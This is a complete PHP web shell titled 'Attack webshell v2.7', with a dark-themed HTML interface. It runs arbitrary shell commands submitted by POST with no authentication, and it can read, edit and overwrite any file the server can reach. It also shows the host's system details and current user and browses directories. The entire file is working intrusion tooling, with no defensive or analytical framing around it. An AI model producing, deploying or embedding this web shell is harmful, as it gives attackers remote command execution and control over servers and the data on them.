<?php
define('SCRIPT_NAME', 'Attack webshell v2.7');

$current_directory = getcwd();
$current_device = shell_exec('uname -a');
$current_user = shell_exec('whoami');
$command_output = '';
$file_content = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	if (!empty($_POST['change_dir'])) {
		$target_dir = $_POST['change_dir'];
		if (is_dir($target_dir)) {
			chdir($target_dir);
			$current_directory = getcwd();
		} else {
			chdir(dirname($target_dir));
			$current_directory = getcwd();
			$file_content = file_get_contents($target_dir);
		}
	}
	
	if (!empty($_POST['update_file']) && isset($_POST['file_content'])) {
		file_put_contents($_POST['update_file'], $_POST['file_content']);
	}
	
	if (!empty($_POST['command'])) {
		$command_output = shell_exec("cd \"{$current_directory}\" && {$_POST['command']} 2>&1");
	}
}

if(isset($_COOKIE["cp_from"]) && isset($_COOKIE["cp_to"]) && !empty($command_output)){
	$command_output = iconv($_COOKIE["cp_from"], $_COOKIE["cp_to"], $command_output);
}
function getDirectoryContents($dir) {
	$result = [];
	if (!is_dir($dir)) {
		return $result;
	}
	
	$items = scandir($dir);
	foreach ($items as $item) {
		//if ($item !== '.' && $item !== '..') {
		$path = $dir . DIRECTORY_SEPARATOR . $item;
		$stat = stat($path);
		
		if($item == ".") $item = "*THIS DIR*";
		
		$result[$item] = [
			'type' => is_dir($path) ? 'directory' : 'file',
			'permissions' => getUnixPermissions(fileperms($path)),
			'owner' => ':0', //posix_getpwuid($stat['uid'])['name'],
			'size' => formatSize($stat['size']),
			'modified' => date("F d Y H:i:s", $stat['mtime']),
		];
		//}
	}
	return $result;
}

function getUnixPermissions($perms) {
	$info = ($perms & 0x4000) ? 'd' : '-'; // Directory or file
	$info .= (($perms & 0x0100) ? 'r' : '-'); // Owner read
	$info .= (($perms & 0x0080) ? 'w' : '-'); // Owner write
	$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : '-'); // Owner execute
	$info .= (($perms & 0x0020) ? 'r' : '-'); // Group read
	$info .= (($perms & 0x0010) ? 'w' : '-'); // Group write
	$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : '-'); // Group execute
	$info .= (($perms & 0x0004) ? 'r' : '-'); // Others read
	$info .= (($perms & 0x0002) ? 'w' : '-'); // Others write
	$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : '-'); // Others execute
	return $info;
}

function formatSize($size) {
	if ($size >= 1048576) {
		return number_format($size / 1048576, 2) . ' MB';
	} elseif ($size >= 1024) {
		return number_format($size / 1024, 2) . ' KB';
	} else {
		return $size . ' bytes';
	}
}

$directory_contents = getDirectoryContents($current_directory);
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?php echo htmlspecialchars(SCRIPT_NAME); ?></title>
<style>
body {
	font-family: Arial, sans-serif;
	background-color: #121212;
	color: #e0e0e0;
}
.directory-path form { display: inline; }
.directory-path input[type="submit"] {
	background: none;
	border: none;
	color: #bb86fc;
	cursor: pointer;
	text-decoration: underline;
}
table { width: 100%; border-collapse: collapse; }
th, td { padding: 8px; text-align: left; border: 1px solid #333; }
th { background-color: #333; }
tr:nth-child(even) { background-color: #1e1e1e; }
tr:hover { background-color: #333; }
textarea { width: 100%; height: 150px; background-color: #333; color: #e0e0e0; border: 1px solid #555; }
input, button {
	background-color: #333;
	color: #e0e0e0;
	border: 1px solid #555;
	padding: 5px;
}
button { cursor: pointer; }
h1, h3 { color: #bb86fc; }
</style>
</head>
<body>
<h1><?php echo htmlspecialchars(SCRIPT_NAME); ?></h1>
<div>
<strong>Device:</strong> <?php echo nl2br(htmlspecialchars($current_device)); ?><br>
<strong>User:</strong> <?php echo htmlspecialchars($current_user); ?><br>
<strong>Current Directory:</strong> <code><?php echo $current_directory; ?></code>
</div>

<br>

<form method="post">
<input type="text" name="command" placeholder="Enter command" autofocus autocomplete="off">
<input type="hidden" name="change_dir" value="<?php echo htmlspecialchars($current_directory); ?>">
<button type="submit">Execute</button>
</form>
<pre><?php echo htmlspecialchars($command_output); ?></pre>

<?php if (!empty($file_content)): ?>
<h3>Editing: <?php echo htmlspecialchars($_POST['change_dir']); ?></h3>
<form method="post">
<textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea><br>
<input type="hidden" name="update_file" value="<?php echo htmlspecialchars($_POST['change_dir']); ?>">
<button type="submit">Save Changes</button>
</form>
<?php endif; ?>

<h3>Directory Contents</h3>
<table>
<thead>
<tr>
<th>Permissions</th>
<th>Name</th>
<th>Type</th>
<th>Size</th>
<th>Owner</th>
<th>Last Modified</th>
</tr>
</thead>
<tbody>
<?php foreach ($directory_contents as $name => $info): ?>
<tr>
<td><?php echo htmlspecialchars($info['permissions']); ?></td>
<td>
<form method="post" style="display:inline;" id="form-<?php echo htmlspecialchars($name); ?>">
<input type="hidden" name="change_dir" value="<?php echo htmlspecialchars($current_directory . '/' . $name); ?>">
<!--input type="submit" value="<?php echo htmlspecialchars($name); ?>" class="link-button"-->
<span class="link-text" onclick="document.getElementById('form-<?php echo htmlspecialchars($name); ?>').submit();">
<?php echo htmlspecialchars($name); ?>
</span>
</form>
</td>
<td><?php echo htmlspecialchars($info['type']); ?></td>
<td><?php echo htmlspecialchars($info['size']); ?></td>
<td><?php echo htmlspecialchars($info['owner']); ?></td>
<td><?php echo htmlspecialchars($info['modified']); ?></td>
</tr>
<?php endforeach; ?>
</tbody>
</table>
<style>
/* Style buttons to look like links */
.link-text {
	background: none;
	border: none;
	color: #bb86fc;
	/*text-decoration: underline;*/
	cursor: pointer;
	font-size: inherit;
	font-family: inherit;
	padding: 0;
	margin: 0;
}

/* Remove focus outline for better aesthetics */
.link-text:focus {
	outline: none;
}

/* Optional: Change color when hovered over */
.link-text:hover {
	color: purple;
}
</style>
</body>
</html>
